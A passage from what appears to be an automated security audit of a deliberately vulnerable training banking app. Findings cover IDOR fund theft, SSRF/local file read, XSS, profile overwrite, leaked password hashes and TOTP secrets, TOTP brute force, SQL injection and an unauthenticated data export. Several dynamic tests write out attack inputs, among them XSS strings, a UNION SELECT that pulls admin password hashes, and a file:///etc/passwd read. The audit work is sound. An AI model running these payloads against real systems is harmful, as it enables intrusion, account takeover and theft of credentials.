Verified end-to-end. (1) Source: AuthController::register validates first_name/last_name only with `required|string|max:100` — no character/charset restriction — and the endpoint requires no authentication, so any external user can set an arbitrary name containing quotes, parentheses, semicolons, etc. (2) Storage: User::create persists the raw value. (3) Sink: customers.js renderDetail() builds `'<button onclick="BankOfEdAdmin.CustomersPage.confirmDelete(' + c.id + ', \'' + U.escapeHtml(c.first_name + ' ' + c.last_name).replace(/'/g, "\\'") + '\')" ...>'` and the resulting HTML string is assigned via `U.$('customer-detail-content').innerHTML = html` (customers.js:161) — confirmed via grep of innerHTML sinks. escapeHtml() (utils.js) HTML-entity-encodes `'` to `&#39;`, which correctly prevents breaking out of the double-quoted HTML attribute, but the code also nests the escaped name inside a *single-quoted JS string literal within that same attribute*. Standard HTML parsing behavior decodes character references in attribute values at parse time, before the inline event-handler body (the decoded attribute text) is compiled as JS. This means the literal `'` reappears in the JS source the browser compiles for the onclick handler, allowing an attacker-controlled name like `x'); alert(document.cookie); //` to break out of the intended string argument and inject arbitrary JS that runs when the admin clicks the Delete (or equivalent) control on that customer's detail page. The `.replace(/'/g, "\\'")` call operating on the already-HTML-escaped string is indeed dead code, exactly as described, since no literal `'` survives escapeHtml to be matched. No CSP headers were found anywhere in the codebase (checked CorsMiddleware and other header-emitting code) that would block inline event-handler execution, and there is no evidence of any output-encoding library or template engine mitigating the JS-context breakout in these admin pages. The admin API token is stored in localStorage (per the finding's evidence and typical api.js pattern), making this a credible session/token theft path once script execution is achieved. This is a legitimate, well-known escaping-context confusion vulnerability (HTML-entity encoding is not sufficient for a nested JS-string sub-context) and the exact vulnerable pattern was confirmed by direct code read, not just the candidate's own excerpt.</reasoning>
<parameter name="controls">["escapeHtml() encodes the outer HTML attribute delimiter/entities (&, <, >, \", ') which does prevent breaking out of the double-quoted HTML attribute boundary itself", "max:100 length limit on first_name/last_name restricts payload size but does not block special characters needed for this exploit (e.g. quote, parens, semicolon, slashes all fit well within 100 chars)"]

## 35. IDOR: transferExternal allows draining funds from any account (no ownership check)

- Lead reference: PWNJ-035
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:transferExternal
- Fingerprint: cfd5f3d58fcee70d559e8e28c2a0bd31c967d3296490f5509d43938c882e4917

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/TransferService.php:transferExternal
```

#### Controls encountered

```
[
  "Route requires authentication (auth=true) but not ownership of the source account",
  "Validator ensures from_account_id is numeric but does not check ownership",
  "TOTP re-verification exists for external transfers but only gates certain payee/first-transfer scenarios and is itself bypassable per adjacent vulnerability comment; it does not verify from-account ownership"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker",
    "POST /api/transfers/external {from_account_id:<victim>, ...}",
    "TransferService::transferExternal() -> Account::findById() (no ownership check)",
    "Debit victim's account, credit attacker-controlled destination BSB/account"
  ],
  "impact": "Theft of funds from arbitrary accounts due to missing ownership validation on the transfer source account.",
  "severity_reasoning": "High: direct financial theft via IDOR, duplicate of PWNJ-032/076 with same code path.",
  "dynamic_test": "As authenticated attacker, call POST /api/transfers/external with from_account_id set to a victim's account id and destination controlled by attacker; verify funds move despite lacking ownership of the source account."
}
```

#### Validator reasoning

The route POST /api/transfers/external (Router.php) requires only `auth => true` (i.e., any authenticated user), not ownership of the source account. TransactionController::transferExternal reads `from_account_id` directly from the JSON body, validates only that it is numeric, and passes it unmodified to TransferService::transferExternal. That service method loads the source account with `Account::findById($fromAccountId)` — which, unlike `Account::findByIdAndUser()` used in the sibling transferOwn() method just above it in the same file, performs no check that the account belongs to the authenticated user. The loaded account's balance is then debited directly (`Account::updateBalance($fromAccountId, '-' . $debitAmount)`) inside a DB transaction and a Transaction record is created — a genuine funds-mutation sink. There is no other authorization check anywhere in the path (no re-check before the update, no post-hoc ownership assertion), and the destination can be an arbitrary BSB/account number or the attacker's own address-book payee. The code even contains an explicit developer comment acknowledging the missing check. TOTP logic downstream is orthogonal (bypassable per VULNERABILITY #8 comment) and does not gate the from-account ownership at all. This is a complete, concrete source (attacker-controlled from_account_id in POST body) to sink (balance debit/transaction creation) path with no effective blocking control.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
// Any authenticated user can supply any account ID as the source.
$fromAccount = Account::findById($fromAccountId);
if (!$fromAccount) {
    Response::notFound('Source account not found.');
}
```

## 36. SSRF/LFI in avatarProxy via unrestricted file_get_contents($data['url'])

- Lead reference: PWNJ-036
- Category: A10
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:avatarProxy
- Fingerprint: 48dd376907c8e10d379fbfbd20190cff84b3355244f0c50254b98d159a8bb7d9

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:avatarProxy
```

#### Controls encountered

```
[
  "Authentication via AuthMiddleware::handle() is required (any valid session token) — not a defense against SSRF/LFI, since it's any authenticated user, not privilege-limited",
  "Emptiness check on $data['url'] — trivially bypassed by supplying any non-empty malicious value",
  "5-second timeout in stream context — reduces blast radius of slow requests but does not prevent SSRF/LFI disclosure"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Whether outbound network egress is restricted at the infrastructure/network layer (e.g. firewall rules blocking access to 169.254.169.254 or internal subnets) cannot be determined from source code alone, though this would be a deployment-level control rather than an application-level fix and does not change code-level exploitability",
  "PHP's allow_url_fopen ini setting must be enabled for the SSRF vector (http(s) URLs) to work via file_get_contents; this is typically enabled by default and not verifiable from this repo, but the LFI vector via local paths works regardless of that setting"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "POST /api/profile/avatar {url:<file:// or internal URL>}",
    "ProfileController::avatarProxy() file_get_contents($data['url']) no allow-list",
    "Local file read or internal service reached",
    "Response bytes returned base64-encoded to attacker"
  ],
  "impact": "SSRF/local-file-read allowing disclosure of internal files (potentially including config secrets) or access to internal-only network services.",
  "severity_reasoning": "High: potential disclosure of local configuration/secrets and access to internal network, serious SSRF/LFI impact.",
  "dynamic_test": "POST /api/profile/avatar with {\"url\":\"file:///etc/passwd\"} or an internal http URL; inspect returned avatar_data (base64-decode) to confirm local file contents or internal service response is disclosed."
}
```

#### Validator reasoning

The full source-to-sink path is present and unmitigated. Route /api/profile/avatar (POST) requires only standard session auth ('auth' => true, i.e. any logged-in user via AuthMiddleware) — no special role check. ProfileController::avatarProxy() reads the raw JSON body via file_get_contents('php://input') and extracts $data['url'] with only an emptiness check (Response::error if empty). It then passes $data['url'] directly and unmodified into file_get_contents($data['url'], false, $context) with no scheme allow-list (e.g. restricting to http/https), no host/IP allow-list or deny-list (no blocking of loopback/link-local/metadata addresses like 127.0.0.1 or 169.254.169.254), and no path restriction preventing local file paths (file_get_contents natively supports the file:// wrapper and plain local paths such as /etc/passwd or relative traversal). On success, the raw fetched content is base64-encoded and returned to the caller in the JSON response (avatar_data), and the raw source_url is echoed back too, giving a full oracle for both SSRF (internal network/cloud-metadata reachability and content) and LFI (arbitrary local file disclosure) that any authenticated user can trigger. This is a textbook exploitable SSRF/LFI: no compensating control (WAF, network egress restriction, CSP, or code-level validation) is visible in the repo for this path — the only guard present is the emptiness check, which does not block malicious values. The @ error-suppression operator and the false-check only handle failure gracefully, they do not add security validation.

#### Code evidence

```
$content = @file_get_contents($data['url'], false, $context);
...
Response::success([
    'avatar_data' => "data:{$mime};base64,{$encoded}",
    'size'        => strlen($content),
    'source_url'  => $data['url'],
]);
```

## 37. Reflected XSS via avatar source_url rendered with jQuery .html()

- Lead reference: PWNJ-037
- Category: A03
- Severity: MEDIUM
- Confidence: 72%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/profile.js:136
- Fingerprint: d66d622c489161e53cbf57e6685757bfdbcc45e52a6690a46256a890fe48a93a

### Evidence Chain

#### Source

```
BankOfEd-main/public/banking/js/pages/profile.js:136
```

#### Controls encountered

```
[
  "Route requires authentication (auth=>true in Router.php), so an unauthenticated actor cannot call the endpoint directly.",
  "Server checks only that `url` is non-empty (Validator not used here, just empty() check) — no scheme/host allow-list, no output encoding on source_url before it is JSON-encoded and returned."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "The primary practical impact is limited to self-XSS: avatarProxy stores the value only into the calling user's own avatar_url (User::update((int)$auth['user']['id'], ...)) and no other controller/admin view was found that renders another user's avatar_url or source_url, so an attacker cannot use this alone to attack a second victim.",
  "Auth is Bearer-token-based (stored in localStorage, sent via Authorization header, not cookies), so classic cross-site CSRF cannot be used to make a victim's browser silently submit a malicious url on the victim's behalf; some other primitive (e.g., a separate CSRF/JS-injection bug) would be required to turn this into a cross-user attack.",
  "No admin or shared surface was found in the repository that displays another user's avatar/source_url, limiting blast radius versus a traditional reflected/stored XSS affecting arbitrary victims."
]
```

#### Proof gaps

```
[
  "Could not find any code path where a user's avatar_url/source_url is rendered to a different principal (e.g., admin panel, other customers), so the confirmed impact is effectively self-XSS rather than a cross-victim reflected XSS as the title implies; severity/impact framing may need adjustment even though the vulnerable sink usage itself is real.",
  "Did not verify runtime PHP configuration (allow_url_fopen, wrapper restrictions) to guarantee the data:// trick always works in the deployed environment, though http(s) URLs to an attacker-controlled server serving arbitrary payload bytes are a straightforward fallback that also always succeeds."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user submits crafted avatar URL",
    "Server echoes source_url verbatim in API response",
    "profile.js renderAvatar() inserts data.source_url via jQuery .html() with no escaping",
    "Injected HTML/script executes in the user's browser"
  ],
  "impact": "Reflected/self XSS via echoed source_url rendered unescaped, executing in the user's own authenticated session.",
  "severity_reasoning": "Medium: primarily self-XSS unless combined with social engineering or other flows, still a genuine unescaped DOM sink.",
  "dynamic_test": "Submit avatar import URL containing an XSS payload in the query string (e.g. http://attacker/x?\"><img src=x onerror=alert(1)>) and observe profile.js renderAvatar() inject source_url via .html() causing script execution."
}
```

#### Validator reasoning

Verified a concrete, unbroken source-to-sink path. Client sends the raw `url` field to POST /api/profile/avatar (api.js importAvatar -> profile.js importAvatar/loadAvatar). Server-side ProfileController::avatarProxy performs no validation/sanitization of `url` beyond a non-empty check; it calls file_get_contents($data['url']) and, provided the fetch succeeds, echoes the exact same attacker-supplied string back verbatim as `source_url` in the JSON response (no encoding, no allow-list of schemes/hosts). The client's renderAvatar() (profile.js:141-143) then inserts that value directly into the DOM with jQuery's `.html()`: `$('#avatar-source').html('Imported ' + data.size + ' bytes from ' + data.source_url)`, with no escaping call (e.g., no use of .text() or an HTML-encoding helper) anywhere on this path. No CSP header is configured anywhere in the deployment scripts that would block inline event-handler execution, so a payload such as `<img src=x onerror=alert(document.cookie)>` would execute.

Exploitability of the "fetch must succeed" precondition is trivial: PHP's file_get_contents supports the `data://` stream wrapper by default, so an attacker can submit url = `data:text/plain,<img src=x onerror=alert(1)>` (or any payload) and the fetch will always succeed without needing any external attacker-controlled server, guaranteeing the payload is stored to avatar_url and reflected back unescaped on this call and on every subsequent profile load (loadAvatar() re-fetches and re-renders it).

This confirms the described DOM sink misuse and the missing output encoding are real and present in the current code, matching the candidate's root cause and evidence exactly.

#### Code evidence

```
$('#avatar-source')
  .html('Imported ' + data.size + ' bytes from ' + data.source_url)
  .removeClass('hidden');
```

## 38. Stored/Reflected XSS via unescaped transaction description on dashboard

- Lead reference: PWNJ-038
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/dashboard.js:67
- Fingerprint: 5697937a644ebb9ebfada0f2e4a753ee0106d200ee044738eb296c1916340ef5

### Evidence Chain

#### Source

```
BankOfEd-main/public/banking/js/pages/dashboard.js:67
```

#### Controls encountered

```
[
  "Server-side length validation only ('description' => 'string|max:255') — does not block HTML/JS payloads",
  "escapeHtml() helper exists in banking/js/utils.js and is used for adjacent fields in the same file, but is specifically omitted for tx.description at the cited sink"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "None found that defeats the vulnerability — the escaping helper omission is isolated to this exact field/line while all sibling fields properly escape"
]
```

#### Proof gaps

```
[
  "Did not execute a live end-to-end exploit (e.g. browser proof-of-concept) to observe script execution; conclusion is based on static code-path analysis of source (transfer description input) through storage (transactions table) to sink (unescaped innerHTML concatenation)",
  "Did not verify whether a CSP header served by the app might mitigate inline script execution in practice; no CSP configuration was located during this review, but full server config was not exhaustively enumerated"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker sends transfer with malicious description (only length-validated)",
    "TransferService persists description verbatim",
    "Victim (recipient/counterparty) views dashboard -> GET recent transactions",
    "dashboard.js renderTransactions() concatenates (tx.description || tx.type) into innerHTML without escapeHtml",
    "Injected script executes in victim's authenticated session"
  ],
  "impact": "Stored XSS executing on victim's dashboard, enabling token theft (localStorage bankofed_token) and account compromise.",
  "severity_reasoning": "High: stored XSS reachable from a normal transfer flow, executing in a victim's session with token-theft potential.",
  "dynamic_test": "Send a transfer to a victim's account with description containing an HTML/script payload; have victim load the dashboard page and confirm the payload executes via renderTransactions() innerHTML injection."
}
```

#### Validator reasoning

Full source-to-sink path confirmed. Source: POST /api/transfers/own and /api/transfers/external accept a `description` field validated server-side only with `'description' => 'string|max:255'` (TransactionController::transferOwn/transferExternal, backed by TransferService::transferOwn/transferExternal), with no HTML sanitization or encoding applied before persisting to the `transactions.description` column (VARCHAR(255) per schema.sql). This value is attacker-controlled by the sender of a transfer and is stored and later retrieved for both the sender's and recipient's transaction history via GET /api/transactions (TransactionController::index -> Transaction::format), so a victim who never entered attacker input still receives it in their own dashboard feed — a genuine cross-account stored XSS primitive.

Sink: dashboard.js renderTransactions() builds the transaction row HTML with `'<p class="font-medium text-slate-900 truncate">' + (tx.description || tx.type) + '</p>'` and assigns the concatenated string to `container.innerHTML`. This is raw string concatenation with no encoding function applied to `tx.description`. Critically, the same file (and same function's neighboring renderAccounts()) consistently wraps other server-provided string fields (account_name, bsb, account_number) in `U.escapeHtml(...)` before concatenation, confirming (a) the escaping helper is available and in active use in this exact module, and (b) the omission for `tx.description` is a specific, exploitable gap rather than a project-wide pattern of unescaped output. `U.escapeHtml` in banking/js/utils.js is a real, correctly implemented HTML-escaping function (`escMap` covering &<>"'), further showing the safe pattern exists but was not applied to this field.

No framework-level auto-escaping applies here (this is manual innerHTML string building, not a templating engine with auto-escape), no CSP is evident to block inline/injected script execution, and no additional client-side sanitization occurs between fetch and render. The only validation anywhere in the pipeline is a max-length check, which does not block HTML/script payloads (e.g. `<img src=x onerror=alert(1)>` fits well within 255 chars).

This constitutes a concrete, reproducible stored XSS: attacker sends a transfer (own account transfer to a controlled account and view own dashboard, or cross-account transfer to a victim causing the payload to render in the victim's dashboard) with a description containing an HTML/script payload, and it executes unescaped in the viewer's browser session, in the banking application context, enabling session/token theft or fraudulent transaction execution via DOM manipulation.

#### Code evidence

```
'<p class="font-medium text-slate-900 truncate">' + (tx.description || tx.type) + '</p>' +
```

## 39. BOLA: ProfileController::update allows overwriting any user's profile via 'user_id' body parameter

- Lead reference: PWNJ-039
- Category: A01
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:update
- Fingerprint: 63158998c6e86e2b2217b48285f0c5e654828dace98bf4e924256e5d083507b2

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:update
```

#### Controls encountered

```
[
  "Field-level format validation (email/phone/postcode regex etc.) - does not restrict target user id",
  "AuthMiddleware requires a valid bearer token - proves caller is *some* authenticated user, but not that the caller owns the target profile",
  "Email uniqueness check when email changed - prevents duplicate emails but doesn't stop overwriting other fields of arbitrary victims"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker",
    "PUT /api/profile with attacker-controlled user_id field",
    "ProfileController::update() uses body user_id over authenticated identity",
    "User::update($targetUserId, ...) with no ownership check",
    "Victim's profile fields overwritten"
  ],
  "impact": "BOLA enabling overwrite of any user's profile data via attacker-controlled user_id parameter, facilitating account takeover.",
  "severity_reasoning": "High: duplicate BOLA finding with direct account-takeover potential via email overwrite.",
  "dynamic_test": "As authenticated user, PUT /api/profile with {\"user_id\":<victim>, \"email\":\"attacker@evil.com\"}; verify victim's profile record is altered."
}
```

#### Validator reasoning

Reviewed ProfileController::update() directly. It reads JSON body, validates only field formats (email/phone/etc), builds $updateData from allowed fields, then computes $targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id']; and calls User::update($targetUserId, $updateData) — with no check that $targetUserId equals the authenticated user's id ($user['id'] from $auth). Router.php registers PUT /api/profile -> ProfileController::update with only 'auth' => true (regular AuthMiddleware, not admin). AuthMiddleware::handle() only validates the bearer token and loads the corresponding user record; it performs no restriction tying the caller to any particular profile id, and imposes no authorization/ownership logic beyond authentication. User::update() performs a raw parameterized UPDATE on users SET ... WHERE id = ? using the supplied $id directly, with no ownership verification. Thus, any authenticated user (even a low-privileged one) can send PUT /api/profile with body {"user_id": <victim_id>, "email": "attacker@evil.com", ...} and the victim's row will be updated (email change enables account takeover via password reset flows, phone/address changes, etc.). There is no CSRF token requirement blocking this (Authorization header based bearer auth), no re-authentication step, and no server-side check comparing $data['user_id'] to $auth['user']['id']. This is a straightforward, unauthenticated-victim-selection BOLA/IDOR vulnerability with a full source (client-controlled JSON body) to sink (SQL UPDATE by arbitrary id) path and no effective mitigating control.

#### Code evidence

```
$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];

if (!empty($updateData)) {
    User::update($targetUserId, $updateData);
}
```

## 40. Sensitive fields (password_hash, totp_secret) leaked in profile/auth API responses

- Lead reference: PWNJ-040
- Category: A02
- Severity: MEDIUM
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/User.php:toPublic
- Fingerprint: 08891601edaf6bca06869d7aa15060cd77f2de5ac5d4d93e5e3b890fb30b3708

### Evidence Chain

#### Source

```
BankOfEd-main/src/Models/User.php:toPublic
```

#### Controls encountered

```
[
  "None found: Response::success() performs no field filtering/whitelisting before json_encode; it is a direct pass-through."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No counterevidence found — checked Response.php, AuthController.php, ProfileController.php and User.php directly; all confirm the leak path with no mitigating control."
]
```

#### Proof gaps

```
[
  "Not verified whether totp_secret is ever null/empty for most users in practice (only set once TOTP setup begins), but this does not diminish the password_hash leak which is unconditional on every login/register/profile response.",
  "Did not verify client-side handling (Api.setUser/localStorage) directly since frontend code wasn't reviewed in this session, but the description's claim about localStorage exposure is plausible and not required to confirm the core server-side over-exposure vulnerability."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated or registering user",
    "AuthController::login/register or ProfileController::show",
    "User::toPublic() includes password_hash and totp_secret",
    "Client (browser/localStorage) receives and stores sensitive fields",
    "Any reader of the response (XSS, proxy, shared device) obtains credential material"
  ],
  "impact": "Every login/register/profile response leaks the password hash and TOTP secret to the client, which combined with BOLA/JWT-forgery findings enables offline cracking and 2FA bypass for any targeted account.",
  "severity_reasoning": "Medium: sensitive data over-exposure in normal API responses, amplifying impact of other vulnerabilities into credential theft.",
  "dynamic_test": "Log in as a test user and inspect the JSON response of POST /api/auth/login or GET /api/profile; confirm password_hash and totp_secret fields are present in the response body."
}
```

#### Validator reasoning

Direct code inspection confirms the vulnerability exactly as described. User::toPublic() in BankOfEd-main/src/Models/User.php (lines 68-84) explicitly includes 'password_hash' => $user['password_hash'] and 'totp_secret' => $user['totp_secret'] in its returned array, alongside benign profile fields. This method is called from three reachable, unauthenticated/authenticated HTTP-exposed controller actions:
1. AuthController::register() -> Response::success(['user' => User::toPublic($user), ...]) on POST /api/auth/register (unauthenticated)
2. AuthController::login() -> same pattern on POST /api/auth/login (unauthenticated)
3. ProfileController::show() -> Response::success(User::toPublic($auth['user'])) on GET /api/profile (authenticated)
4. ProfileController::update() -> same pattern after profile update

Response::success() (Helpers/Response.php) performs no filtering — it directly json_encode()s the passed $data array and echoes it to the client, then exits. There is no intermediate whitelist, serialization annotation, or field-stripping layer between toPublic() and the HTTP response body. Thus every login, registration, and profile fetch/update response leaks the bcrypt password_hash and the raw TOTP shared secret (when set) directly to the client in plaintext JSON. This is a clear, concrete, unauthenticated-reachable (for login/register) and authenticated-reachable (for profile) source-to-sink path with no blocking control.

Impact: password_hash enables offline dictionary/brute-force attacks against the bcrypt hash if the response is captured (XSS, MITM, proxy logs, browser history/cache, or shared device inspection via localStorage as noted — Api.setUser presumably persists this object client-side). totp_secret directly enables generating valid 2FA codes without needing the device, fully defeating the second factor. This is a legitimate, high-value confidentiality issue (CWE-200 / OWASP A02:2021 Cryptographic Failures, matching category A02 assigned).

#### Code evidence

```
return [
    ...
    'password_hash' => $user['password_hash'],
    'totp_secret'   => $user['totp_secret'],
];
```

## 41. No rate limiting / lockout on TOTP verification allows brute-forcing 6-digit codes

- Lead reference: PWNJ-041
- Category: A07
- Severity: MEDIUM
- Confidence: 70%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:totpVerify
- Fingerprint: 76c4cb7e4f00e1ecb8f04214e5b21737a1965345c719562c1007c47a6e4677b8

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:totpVerify
```

#### Controls encountered

```
[
  "AuthMiddleware requires a valid bearer/session token to reach the endpoint at all, meaning this is not a pre-auth brute force but requires attacker to already hold a valid session for the target account (e.g., via token theft, XSS, or other session compromise).",
  "Input validator restricts totp_code to exactly 6 digits (format only, not a throttling control)."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "Because auth is required and operates only on the caller's own account ($auth['user']), this is not a classic pre-authentication login-bypass brute force; the attacker already needs a live session for the victim, which is itself a significant precondition and somewhat limits real-world blast radius compared to bypassing initial login.",
  "No evidence of any infra-level (e.g., WAF, nginx, cloud) rate limiting in this repo, but such controls could conceivably exist outside the reviewed codebase (not verifiable from source alone)."
]
```

#### Proof gaps

```
[
  "Cannot verify from source alone whether an external layer (reverse proxy, API gateway, WAF) enforces request throttling in the actual deployed environment; the repository itself shows no such control.",
  "Practical exploitability is bounded by network/request throughput within the ~90s validity window per code; the lead's own filter_reasoning acknowledges this dependency, but it does not defeat the fact that the application layer imposes zero limiting."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker holding a valid (possibly stolen) bearer token",
    "POST /api/profile/totp/verify or /totp/disable repeatedly",
    "ProfileController::totpVerify() calls TotpService::verify() with no attempt counter/lockout",
    "Automated brute force across ~1,000,000 code space (reduced by ±1 window)",
    "Eventually guesses correct code, completing TOTP setup verification or disabling 2FA"
  ],
  "impact": "Lack of rate limiting allows brute-forcing the 6-digit TOTP code space, enabling 2FA bypass/disable given enough automated attempts within the code validity window.",
  "severity_reasoning": "Medium: exploitation requires many rapid requests and prior access to a bearer token, but no compensating control exists at all.",
  "dynamic_test": "Script repeated POST requests to the TOTP verify endpoint with sequential/random 6-digit codes for a test account; confirm no lockout, delay, or rate limit is triggered after many attempts within a 30-second TOTP window."
}
```

#### Validator reasoning

Code inspection confirms the claim precisely. ProfileController::totpVerify() and totpDisable() (BankOfEd-main/src/Controllers/ProfileController.php) call TotpService::verify() with only input-format validation (Validator::make 'required|digits:6') and no attempt counter, delay, backoff, or lockout of any kind. TotpService::verify() (src/Services/TotpService.php) simply delegates to the OTPHP library's verify($code, null, $config['totp_window']) with config totp_digits=6, totp_period=30, totp_window=1 (config/app.php), meaning a code space of 10^6 with an effective validity window of ~90s (current + adjacent periods). Router.php shows these routes only apply AuthMiddleware (bearer-token authentication check) — there is no throttling middleware in the entire dispatch pipeline (grep across src/ found no rate-limit/throttle/attempt/lockout logic anywhere in the codebase). Thus an authenticated caller (or holder of a stolen/leaked bearer token for the victim account) can script unlimited POST /api/profile/totp/verify or DELETE /api/profile/totp requests, iterating 6-digit guesses with no cost, eventually landing a valid code within a live window (probabilistically requiring on the order of hundreds of thousands of guesses per window at best-case, but zero requests are blocked/delayed, so this is entirely a function of attacker request throughput — a scriptable, unmitigated weakness). This matches OWASP A07 guidance that 2FA verification endpoints must have rate limiting; its absence here is a genuine, confirmed gap with a full source-to-sink path: request -> AuthMiddleware (any valid session token) -> totpVerify/totpDisable -> TotpService::verify -> no lockout -> repeat.

#### Code evidence

```
if (!TotpService::verify($user['totp_secret'], $data['totp_code'], $user['email'])) {
    Response::forbidden('TOTP_INVALID', 'Invalid TOTP code. Please try again.');
}
User::update((int)$user['id'], ['totp_enabled' => 1]);
```

## 42. SQL Injection in admin customer search (AdminUserController::index)

- Lead reference: PWNJ-042
- Category: A03
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:index
- Fingerprint: 73eb727b9dc360fa1e9a923377621e148002627aa99369621418bfd2d3870d59

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/AdminUserController.php:index
```

#### Controls encountered

```
[
  "AdminAuthMiddleware requires a valid, non-revoked admin JWT to reach the endpoint (raises exploitation bar to an authenticated admin actor, but does not sanitize or parameterize the search input, so it does not block the SQLi itself)"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "None found: no escaping, parameter binding, or input validation exists for the 'search' value between $_GET read and SQL execution."
]
```

#### Proof gaps

```
[
  "Exact DB error-reporting/verbosity behavior for blind exploitation is not confirmed, but UNION-based injection is clearly straightforward given the query directly returns columns to the JSON response, so this does not affect exploitability.",
  "Exploitation requires possession of a valid admin JWT (or compromise thereof); the finding does not claim unauthenticated exploitation, and the report correctly frames it as reachable by 'an admin (or anyone able to reach this endpoint)'."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated admin (or reachable actor)",
    "GET /api/admin/customers?search=<payload>",
    "AdminUserController::index() interpolates $_GET['search'] into raw SQL",
    "$db->query() executes attacker-controlled SQL",
    "Arbitrary data exfiltration including admin_users password hashes"
  ],
  "impact": "SQL injection in admin search allows exfiltration of admin credentials or arbitrary DB tables via UNION-based or boolean/time-based techniques.",
  "severity_reasoning": "High: unparameterized SQLi with UNION capability against a table storing admin credentials.",
  "dynamic_test": "GET /api/admin/customers?search=x' UNION SELECT username,password_hash,3,4,5,6,7 FROM admin_users-- - with admin auth; confirm injected rows appear in the customer list response."
}
```

#### Validator reasoning

Reviewed AdminUserController::index() directly. The code reads $search = $_GET['search'] ?? '' with zero validation/sanitization, then interpolates it verbatim into a SQL WHERE clause string ("WHERE first_name LIKE '%{$search}%' OR ..."), which is concatenated into both $countSql and $sql and executed via $db->query() (PDO::query, not prepare/execute with bound parameters). AdminDatabase::getInstance() returns a plain PDO connection with PDO::ATTR_EMULATE_PREPARES=>false, which has no bearing here since query() is called with a fully-built string containing no placeholders at all — there is no parameterization to speak of and no escaping function (e.g., quote()) applied to $search. This is a textbook classic SQL injection: an attacker-controlled value flows unmodified from source ($_GET['search']) to sink ($db->query($sql)) with string concatenation as the only transformation.

Reachability confirmed via AdminRouter.php: GET /api/admin/customers routes to AdminUserController::index with 'auth' => true, enforced by AdminAuthMiddleware, which validates a JWT (issuer, revocation, admin user existence) but performs no input sanitization relevant to the search parameter — it only requires a valid admin JWT to reach the handler. This does not mitigate the SQLi: any authenticated admin (or an attacker who has compromised/obtained an admin token via other means, e.g. XSS/token theft/insider) can trivially inject SQL through the search parameter to read/exfiltrate arbitrary data (e.g., admin_users credentials via UNION SELECT) or manipulate the query further. The requirement of a valid admin session raises the bar to exploit but does not eliminate the vulnerability class or its severity, since it grants a normal authenticated actor with only "index customers" intent the ability to escalate to full DB compromise, which is squarely in scope for classification as exploitable/high severity A03 injection.

No sanitizing library, escaping (addslashes/PDO::quote), allow-listing, or parameterized binding is used for $search anywhere in the file or in AdminDatabase.php. No WAF or additional middleware intercepts query parameters. The vulnerability is real, concrete, and directly matches the reported evidence with an unambiguous source-to-sink path.

#### Code evidence

```
$search = $_GET['search'] ?? '';
...
if ($search !== '') {
    $where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
}
$countSql = "SELECT COUNT(*) FROM users {$where}";
$stmt = $db->query($countSql);
...
$sql = "SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}";
$stmt = $db->query($sql);
```

## 43. Unauthenticated full customer/account/transaction data export endpoint

- Lead reference: PWNJ-043
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/AdminRouter.php:44
- Fingerprint: a3954a7adac90987fd24d9bab7440651b7228b8eae02e2d283f97e53d9d13d9b

### Evidence Chain

#### Source

```
BankOfEd-main/src/AdminRouter.php:44
```

#### Controls encountered

```
[
  "AdminAuthMiddleware::handle() exists and is used by every other admin route (checks JWT signature, issuer, revocation, and admin_users existence) but is deliberately skipped for this specific route because 'auth' => false is set in the route definition.",
  "CorsMiddleware runs on all /api/* requests but only sets CORS headers, providing no authentication."
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not verify runtime deployment configuration (e.g., whether a reverse proxy/WAF external to this repository blocks the /api/admin/export path), but no such control is present in the reviewed application code."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/admin/export/users (auth=false in AdminRouter)",
    "AdminUserController::exportAll()",
    "Full dump of users/accounts/transactions tables returned"
  ],
